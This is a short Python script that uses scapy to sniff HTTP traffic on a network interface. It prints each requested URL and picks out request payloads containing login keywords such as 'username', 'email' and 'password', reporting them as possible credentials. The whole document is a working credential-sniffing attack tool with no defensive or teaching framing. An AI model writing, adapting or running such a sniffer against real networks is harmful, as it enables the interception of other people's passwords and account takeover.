#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='local interface to sniff on')
    options = parser.parse_args()
    if not options.interface:
        parser.error('[-] Please specify an interface, use --help for more info.')
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['uname', 'username', 'login', 'email', 'password', 'pass']

        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Request to: ' + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password found: ' + login_info + '\n\n')


iface = get_arguments()
sniff(iface.interface)
